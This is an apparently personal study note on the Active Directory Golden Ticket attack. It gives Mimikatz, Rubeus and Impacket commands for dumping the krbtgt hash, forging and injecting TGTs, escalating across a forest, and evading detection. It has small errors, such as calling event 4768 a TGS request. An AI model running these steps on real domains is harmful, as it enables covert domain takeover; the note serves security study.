---
created: 2026-08-06
updated: 2026-10-11
tags:
  - AD
  - AD_attacks
  - Kerberos
status: complete
proofread: yes
---
## Golden Ticket

> A **Golden Ticket** attack is a post-exploitation technique in which an attacker who holds the **`krbtgt` account's long-term key** forges **Kerberos Ticket Granting Tickets (TGTs)** to impersonate arbitrary users, assign them arbitrary group memberships, and set an arbitrary ticket lifetime.

- The attack abuses the fact that every TGT is **encrypted and signed with the `krbtgt` account's key**.
- The KDC uses this same key to validate any TGT presented to it. 
- Whoever holds the `krbtgt` key can therefore **create a TGT the KDC will accept as its own**.

>[!important] A NT, AES-128, or AES-256 hash of the `krgtgt` account is sufficient for the attack.

>[!note] See [[Kerberos#krbtgt account]]. 

- Each TGT contains a PAC (Privilege Attribute Certificate), a ticket structure that records the user's identity and group memberships. The PAC is signed with the `krbtgt` key.
- Since you author and sign that PAC, you control every authorization field inside the ticket: you can claim to be `Administrator`, a member of `Domains Admins` or `Enterprise Admins`, or the holder of any SID.

>[!note] See [[Kerberos#Privilege Attribute Certificate (PAC)]].

>[!note] The forged TGT is called a **Golden Ticket**.

- In other words, you can forge a credential that grants **domain-wide access to any Kerberos service**. 
- It survives password resets of the impersonated user and remains valid until the `krbtgt` password is reset **twice** (AD keeps both the current and previous `krbtgt` keys; after just one reset, KDC still accepts tickets signed with the old one).

>[!note] See [[Kerberos]].

> [!note] A Golden Ticket is a **post-exploitation** technique. Obtaining the `krbtgt` key already requires **DC- or `Domain Admin`-level access** (e.g., via [[DCSync]] or dumping `NTDS.dit`).

> [!note]- Golden Ticket vs. Silver Ticket
> - **Golden Ticket** forges a **TGT (Ticket Granting Ticket)**, which can be used to request STs (Service Tickets) from the KDC (TGS, Ticket Granting Service). It can grant access to **any Kerberos service in the domain**. 
> - **[[Silver Ticket]]** forges a **ST (Service Ticket)**, which grants access to just only specific service on a single host. The attack doesn't involve connecting to the KDC, since the ticket is presented directly to the target service during the AP exchange.
> 
>>[!note] See [[Silver Ticket]].

- Prerequisites for the attack:
	- The **`krbtgt` account's long-term key** — its NT hash (RC4) or, preferably, its AES-128/AES-256 key.
	- The **domain SID** (the domain's security identifier, e.g. `S-1-5-21-3842939050-3880317879-2865463114`).
	- The **domain FQDN** (e.g. `example.com`) and a target **username** to impersonate.
	- To use the ticket, you need to be able to reach the DC (port `88`) and the target service. 
	- The DNS must be configured correctly (Kerberos requires FQDNs to operate).

>[!important] The forged TGT is obtained offline, not through an AS exchange with the KDC. You inject the ticket directly into the Kerberos cache and proceed straight to the TGS exchange.

> [!important] The impersonated account does not need to exist in the domain for the forged ticket to be cryptographically valid, but on patched DCs, forging a **real, privileged account** (classically `Administrator`, RID `500`) is far more reliable than inventing one.

> [!important] Because the `krbtgt` password is **never rotated automatically**, a Golden Ticket can persist for **years** unless defenders deliberately perform the double reset.
## Executing the Golden Ticket attack
### Obtaining the `krbtgt` key

- The `krbtgt` account's long-term key can be obtained through the [[DCSync]] attack or dumped directly from the DC's LSASS memory using Mimikatz.

```bash
secretsdump.py -just-dc-user krbtgt EXAMPLE.COM/jdoe@172.16.5.5
```

```powershell
lsadump::dcsync /user:EXAMPLE\krbtgt
```

>[!note] See [[DCSync]].

- To dump the key directly from the LSASS memory on the DC, you can use Mimikatz's [`lsadump::lsa`](https://tools.thehacker.recipes/mimikatz/modules/lsadump/lsa) (requires `SeDebugPrivilege` on the DC):

```powershell
privilege::debug
```
```powershell
lsadump::lsa /inject /name:krbtgt
```

> [!note]- `lsadump::lsa` options
> |Option|Description|
> |---|---|
> | `/name`, `/user`| Target user account.|
> |`/id`| RID (Relative Identifier) of the target account, e.g., `500` for `Administrator`.|
> |`/patch`|Only dump LM/NT password hashes.|
> |`/inject`|When run on workstations, dump LM/NT password hashes.<br>When run on DCs, dump LM/NT password hashes, Wdigest and Kerberos keys, and password history.|

### Obtaining domain SID

- To be considered valid by the KDC, a forged Golden Ticket must include the correct domain SID. Without it, the ticket's internal structure will mismatch the domain's known identifiers and be immediately rejected.
- The domain SID is also needed to construct valid group membership plains within the ticket's PAC.
- To obtain the domain SID:

```powershell
whoami /user
```

```powershell
(Get-ADDomain).DomainSID.Value
```

```bash
rpcclient -U '' <DC_IP_address>
rpcclient $> lookupdomain CORP
```


> [!tip]+
> - A domain SID looks like `S-1-5-21-3842939050-3880317879-2865463114`; a full account SID is a domain SID + the account's RID, e.g. the `Administrator`'s SID is `<domain_SID>-500`.

### Forging the Golden Ticket

#### Mimikatz (from Windows)

- You can forge Golden Tickets using Mimikatz's [`kerberos::golden`](https://tools.thehacker.recipes/mimikatz/modules/kerberos/golden). The module can also automatically inject the forged ticket directly into the current logon session (`/ptt`).

- Forge and inject a Golden Ticket using the `krbtgt` **NT hash (RC4)**:

```powershell
kerberos::golden /user:Administrator /domain:example.com /sid:S-1-5-21-3842939050-3880317879-2865463114 /krbtgt:16e26ba33e455a8c338142af8d89ffbc /id:500 /ptt
```

- Forge and inject using the `krbtgt` **AES-256 key**:

```powershell
kerberos::golden /user:Administrator /domain:example.com /sid:S-1-5-21-3842939050-3880317879-2865463114 /aes256:5e3d2096ebb2c4e3fb1cff61f1ac35e6e... /id:500 /ptt
```

- Forge and **save to a `.kirbi` file** instead of injecting (for later use in a [[Pass-the-Ticket]] attack):

```powershell
kerberos::golden /user:Administrator /domain:example.com /sid:S-1-5-21-3842939050-3880317879-2865463114 /krbtgt:16e26ba33e455a8c338142af8d89ffbc /id:500 /ticket:golden.kirbi
```

| Option         | Description                                                                                      |
| -------------- | ------------------------------------------------------------------------------------------------ |
| `/user`        | Username to impersonate inside the ticket (e.g. `Administrator`).                                |
| `/domain`      | Target domain FQDN.                                                                              |
| `/sid`         | Domain SID.                                                                                      |
| `/krbtgt`      | `krbtgt` NT hash (forge an RC4-encrypted ticket).                                                |
| `/aes128`      | Use the `krbtgt` AES-128 key instead of the NT hash.                                             |
| `/aes256`      | Use the `krbtgt` AES-256 key instead of the NT hash (preferred).                                 |
| `/id`          | RID of the impersonated user (`500` for the built-in `Administrator`).                           |
| `/groups`      | Group RIDs to embed in the PAC (default `513,512,520,518,519`).                                  |
| `/sids`        | Extra SIDs to add to the PAC (cross-domain escalation).                                          |
| `/startoffset` | Minutes offset for the ticket start time (`0` = now; negative = in the past).                    |
| `/endin`       | Ticket lifetime in minutes (default ~10 years; set to `600` to mimic the 10-hour domain policy). |
| `/renewmax`    | Maximum renewal window in minutes.                                                               |
| `/ptt`         | Inject the forged ticket into the current session instead of saving it.                          |
| `/ticket`      | Save the forged ticket to a file.                                                                |

> [!note] Mimikatz also exposes the legacy alias `kerberos::golden /rc4:` for `/krbtgt:`.
#### Rubeus (from Windows)

- You can also use [`Rubeus`](https://github.com/GhostPack/Rubeus)' `golden` to forge Golden Tickets.

- Forge a Golden Ticket using the `krbtgt` NT hash:

```powershell
Rubeus.exe golden /rc4:16e26ba33e455a8c338142af8d89ffbc /user:Administrator /id:500 /domain:example.com /sid:S-1-5-21-3842939050-3880317879-2865463114 /ptt
```

- Forge and inject using the `krbtgt` AES-256 key:

```powershell
Rubeus.exe golden /aes256:5e3d2096ebb2c4e3fb1cff61f1ac35e6e... /user:Administrator /id:500 /domain:example.com /sid:S-1-5-21-3842939050-3880317879-2865463114 /ptt
```

- Automatically query the DC over **LDAP** to populate the PAC with the impersonated user's real group memberships and metadata:

```powershell
Rubeus.exe golden /rc4:16e26ba33e455a8c338142af8d89ffbc /user:Administrator /domain:example.com /sid:S-1-5-21-3842939050-3880317879-2865463114 /ldap /ptt
```

| Option        | Description                                                                             |
| ------------- | --------------------------------------------------------------------------------------- |
| `/rc4:`       | `krbtgt` NT hash (RC4 key); aliases `/ntlm:`, `/krbtgt:`.                                |
| `/aes128:`    | Forge with the `krbtgt` AES-128 key.                                                     |
| `/aes256:`    | Forge with the `krbtgt` AES-256 key (preferred).                                         |
| `/user:`      | Username to impersonate.                                                                 |
| `/id:`        | RID of the impersonated user.                                                            |
| `/groups:`    | Group RIDs to embed in the PAC.                                                          |
| `/sid:`       | Domain SID.                                                                              |
| `/sids:`      | Extra SIDs for cross-domain escalation.                                                  |
| `/domain:`    | Target domain FQDN.                                                                      |
| `/ldap:`      | Query the DC via LDAP to auto-fill realistic PAC data for the impersonated user.         |
| `/starttime`, `/endtime`, `/renewtill` | Control the ticket validity window (set realistic values for OPSEC). |
| `/ptt`        | Inject the forged ticket into the current session.                                      |
| `/outfile:`   | Save the forged ticket to a file.                                                       |
| `/printcmd`   | Print the exact command used, for reproducibility.                                      |

### Impacket `ticketer.py` (from Linux)

- To forge Golden Tickets from Linux, you can use Impacket's [`ticketer.py`](https://github.com/fortra/impacket/blob/master/examples/ticketer.py). It sages the forged TGT to a `.ccache` file (named after the impersonated user).

- Forge a Golden Ticket using the `krbtgt` NT hash:

```bash
ticketer.py -nthash 16e26ba33e455a8c338142af8d89ffbc -domain-sid S-1-5-21-3842939050-3880317879-2865463114 -domain example.com Administrator
```

- Forge a Golden Ticket using the `krbtgt` AES-256 key:

```bash
ticketer.py -aesKey 5e3d2096ebb2c4e3fb1cff61f1ac35e6e... -domain-sid S-1-5-21-3842939050-3880317879-2865463114 -domain example.com Administrator
```

- Point `KRB5CCNAME` at the forged ticket and use it with any Kerberos-aware Impacket tool (`-k -no-pass`):

```bash
export KRB5CCNAME=Administrator.ccache
```

```bash
psexec.py -k -no-pass example.com/Administrator@DC01.example.com
```

| Option         | Description                                                                 |
| -------------- | --------------------------------------------------------------------------- |
| `-nthash`      | `krbtgt` NT hash (forge an RC4-encrypted ticket).                           |
| `-aesKey`      | `krbtgt` AES-128/AES-256 key (preferred).                                   |
| `-domain-sid`  | Domain SID.                                                                 |
| `-domain`      | Target domain FQDN.                                                         |
| `-groups`      | Comma-separated group RIDs for the PAC (default `513,512,520,518,519`).     |
| `-user-id`     | RID of the impersonated user (`500` for `Administrator`).                   |
| `-extra-sid`   | Extra SIDs for cross-domain escalation.                                     |
| `-duration`    | Ticket lifetime in days (default `3650`; lower it to blend in).             |

> [!note] The trailing positional argument (`Administrator` above) is the username to impersonate; the resulting file is `Administrator.ccache`.

### Using the forged ticket

### On Windows

- Confirm the forged TGT is present in the Kerberos cache:

```cmd
klist
```

- Access the DC's file system or run remote tooling as the impersonated `Domain Admin`:

```cmd
dir \\DC01.example.com\c$
```

```powershell
Enter-PSSession -ComputerName DC01.example.com
```

- Mimikatz can also spawn a new command prompt that inherits the injected ticket:

```powershell
misc::cmd
```

> [!tip] A fresh Golden Ticket is a full [[Pass-the-Ticket]] primitive — once injected, use that DC-admin access to run [[DCSync]], dump `NTDS.dit`, or establish further persistence.

### On Linux

- With `KRB5CCNAME` set to the `.ccache`, verify and use it through Impacket (`-k -no-pass`):

```bash
klist
```

```bash
wmiexec.py -k -no-pass example.com/Administrator@DC01.example.com
```

```bash
secretsdump.py -k -no-pass DC01.example.com
```

> [!important] Kerberos requires the target **FQDN**, correct **DNS resolution**, and **clock synchronization** with the DC (within ~5 minutes). See [[Pass-the-Ticket]].

## Cross-domain escalation with extra SIDs

- Once you've comprimised a **child domain** and hold its `krbtgt` key, you may be able to escalate privileges across the **entire Active Directory forest**.
- You forge a Golden Ticket that adds your user to the forest root's **`Enterprise Admins`** group (SID `<root_domain_SID>-519`).

>[!tip]+
>- To get the forest root's domain SID, you can use `Get-DomainSID -Domain root.example.com`, `(Get-ADDomain -Server root.fqdn).DomainSID.Value`, or `lookupsid.py`. 

- Mimikatz:

```powershell
kerberos::golden /user:Administrator /domain:child.example.com /sid:<child_domain_SID> /krbtgt:<child_krbtgt_hash> /sids:<root_domain_SID>-519 /ptt
```

- Rubeus:

```powershell
Rubeus.exe golden /rc4:<child_krbtgt_hash> /user:Administrator /domain:child.example.com /sid:<child_domain_SID> /sids:<root_domain_SID>-519 /ptt
```

- Impacke'st `ticketer.py`:

```bash
ticketer.py -nthash <child_krbtgt_hash> -domain-sid <child_domain_SID> -extra-sid <root_domain_SID>-519 -domain child.example.com Administrator
```

> [!tip]+
>- Once injected into the logon session, access resources in the forest root domain (such as `\\ROOT-DC.example.com\c$`) to trigger the automatic cross-domain Kerberos referral exchange.

## Detection considerations

- A forged Golden Ticket leaves traces in logs. When operating with stealth in mind, consider the following:

	- **RC4 encryption**
		- By default, legacy tools use RC4 (`rc4-hmac`/`0x17`) to encrypt the TGT. In modern environments where AES encryption (`aes256-cts-hmac-sha1-96`/`0x12`) is standard, an RC4-encrypted TGT used by a high-privileged account is far too noticeable (Event ID `4769` requesting service tickets using encryption type `0x17`).
		- To avoid detection, forge tickets using the `krbtgt` account's **AES-256 key**, if available (`/aes256` in Mimikatz/Rubeus or `-aesKey` in `ticketer.py`).
	
	- **Ticket 10-year lifetime**
		- Tools default to a 10-year validity window (`3650 days`). Standard Active Directory Kerberos policy defines a maximum user ticket lifetime of **10 hours** (`600 minutes`) and a renewal limit of **7 days** (`10080 minutes`). Long-lived tickets can easily raise an analyst's concerns.
		- To make the Golden Ticket less noticable, specify realistic expiration and renewal windows (e.g., Mimikatz `/endin:600 /renewmax:10080`, Rubeus `/endtime:600 /renewtill:10080`, or Impacket `-duration 1`).
	
	- **PAC integrity**
		- Forging tickets for arbitrary non-existent accounts or inventing group memberships that deviate from real Active Directory schema can trigger alerts or fail PAC validation checks, if in place.
		- Therefore, it's better to impersonate existing domain users (e.g., the built-in `Administrator`, RID `500`). 
		- `Rubeus`'s `/ldap` can automatically query the DC and populate the PAC with actual data.
	
	- **Fabricated TGT**
		- Because Golden Tickets are generated offline, no authentication requests (Event ID `4768`, TGS request) preceeed service ticket requests (Event ID `4769`, ST request) for that user session as it usually happens during normal Kerberos operation. This can be detected as well.
		- To deal with that, consider *Diamond Ticket* and *Sapphire Ticket* attacks.

## References and further reading

- [`RFC 4120 — The Kerberos Network Authentication Service (V5)`](https://www.rfc-editor.org/info/rfc4120)
- [`Golden ticket — The Hacker Recipes`](https://www.thehacker.recipes/ad/movement/kerberos/forged-tickets/golden)
- [`Kerberos Golden Tickets — ADSecurity (Sean Metcalf)`](https://adsecurity.org/?p=1640)
- [`Mimikatz — gentilkiwi GitHub`](https://github.com/gentilkiwi/mimikatz)
- [`Rubeus — GhostPack GitHub`](https://github.com/GhostPack/Rubeus)
- [`Impacket ticketer.py — Fortra GitHub`](https://github.com/fortra/impacket/blob/master/examples/ticketer.py)
- [`AD Forest Trusts and SID Filtering — The Hacker Recipes`](https://www.thehacker.recipes/ad/movement/trusts)
- [`Reset the krbtgt account password/keys — Microsoft GitHub`](https://github.com/microsoft/New-KrbtgtKeys.ps1)
- [`Event 4768 — A Kerberos authentication ticket (TGT) was requested — Microsoft Learn`](https://learn.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4768)
- [`Event 4769 — A Kerberos service ticket was requested — Microsoft Learn`](https://learn.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4769)


